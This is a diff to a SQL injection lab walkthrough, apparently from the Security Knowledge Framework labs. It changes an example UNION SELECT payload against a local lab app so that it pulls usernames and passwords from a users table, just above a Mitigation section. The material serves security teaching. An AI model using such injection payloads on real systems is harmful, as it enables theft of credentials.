@@ -104,7 +104,7 @@ http://0.0.0.0:5000/home/1 union select 1,2,3 from user
 ![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/SQLI/9.png)
 
 ```
-http://0.0.0.0:5000/home/1 union select 1,2,3 from users
+http://0.0.0.0:5000/home/1 union select 1,Username,Password from users
 ```
 
 ## Mitigation
